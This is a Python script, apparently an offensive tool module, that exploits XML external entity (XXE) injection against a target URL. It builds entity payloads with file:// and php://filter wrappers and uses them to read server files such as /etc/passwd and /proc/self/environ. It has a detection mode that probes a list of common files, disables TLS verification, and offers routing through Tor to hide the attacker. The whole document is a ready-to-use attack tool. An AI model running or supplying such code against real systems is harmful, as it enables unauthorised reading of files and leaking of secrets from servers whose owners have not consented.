#!/usr/bin/env python3
import requests
import base64
import re
import argparse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

ENCODINGS = ["none", "url", "double"]

DEFAULT_PAYLOADS = [
    "/etc/passwd",
    "/etc/hostname",
    "/etc/hosts",
    "/proc/self/environ",
]

def build_xxe_payload(file_path, xml_field="email", use_php_filter=False):
    if use_php_filter:
        resource = f"php://filter/convert.base64-encode/resource={file_path}"
    else:
        resource = f"file://{file_path}"

    payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{resource}">
]>
<root>
<{xml_field}>&xxe;</{xml_field}>
</root>
"""
    return payload.encode()

def decode_response(text, use_php_filter=False):
    if use_php_filter:
        b64_only = re.sub(r'[^A-Za-z0-9+/=]', '', text)
        if not b64_only:
            return None
        # Fix padding
        if len(b64_only) % 4:
            b64_only += '=' * (4 - len(b64_only) % 4)
        try:
            return base64.b64decode(b64_only).decode("utf-8", errors="ignore")
        except Exception as e:
            print(f"[!] Base64 decode error: {e}")
            return None
    else:
        return text

def exploit_xxe(url, file_path, xml_field="email", use_php_filter=False, proxies=None, method="POST"):
    payload = build_xxe_payload(file_path, xml_field, use_php_filter)
    headers = {"Content-Type": "application/xml"}

    try:
        if method == "POST":
            r = requests.post(url, data=payload, headers=headers, verify=False, proxies=proxies, timeout=10)
        elif method == "GET":
            r = requests.get(url, params={"xml": payload}, headers=headers, verify=False, proxies=proxies, timeout=10)
        else:
            raise ValueError(f"Invalid method: {method}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Request error: {e}")
        return None

    if r.status_code != 200:
        print(f"[!] Unexpected status code: {r.status_code}")

    print("[*] Raw response:")
    print(r.text)

    decoded = decode_response(r.text, use_php_filter)
    if decoded:
        print("\n[+] Decoded output:")
        print(decoded)
    else:
        print("\n[-] Could not extract content from response")

    return decoded

def detect_xxe(url, xml_field="email", proxies=None):
    """
    Try a list of common files to confirm XXE is present.
    Returns the first file path that produces readable output.
    """
    print("[*] Running XXE detection with common file payloads...")

    for file_path in DEFAULT_PAYLOADS:
        print(f"[*] Trying: {file_path}")
        result = exploit_xxe(url, file_path, xml_field, use_php_filter=False, proxies=proxies)
        if result and len(result.strip()) > 0:
            print(f"[+] XXE confirmed via: {file_path}")
            return file_path

    print("[-] XXE not detected with default payloads")
    return None

def main():
    parser = argparse.ArgumentParser(description="XXE Injection Module")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("file_path", nargs="?", default="/etc/passwd", help="File to read (default: /etc/passwd)")
    parser.add_argument("--method", default="POST", choices=["POST", "GET"], help="HTTP method (default: POST)")
    parser.add_argument("--field", default="email", help="XML field name to inject into (default: email)")
    parser.add_argument("--php-filter", action="store_true", help="Use PHP filter base64 wrapper (for PHP targets)")
    parser.add_argument("--detect", action="store_true", help="Try common files to confirm XXE exists")
    parser.add_argument("--tor", action="store_true", help="Route traffic through Tor")
    parser.add_argument("--outfile", default=None, help="Save output to file")

    args = parser.parse_args()

    proxies = None
    if args.tor:
        print("[*] Routing traffic through Tor...")
        proxies = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}

    if args.detect:
        detect_xxe(args.url, args.field, proxies)
        return

    result = exploit_xxe(
        args.url,
        args.file_path,
        args.field,
        args.php_filter,
        proxies
    )

    if result and args.outfile:
        with open(args.outfile, "w") as f:
            f.write(result)
        print(f"[+] Output saved to {args.outfile}")

if __name__ == "__main__":
    main()
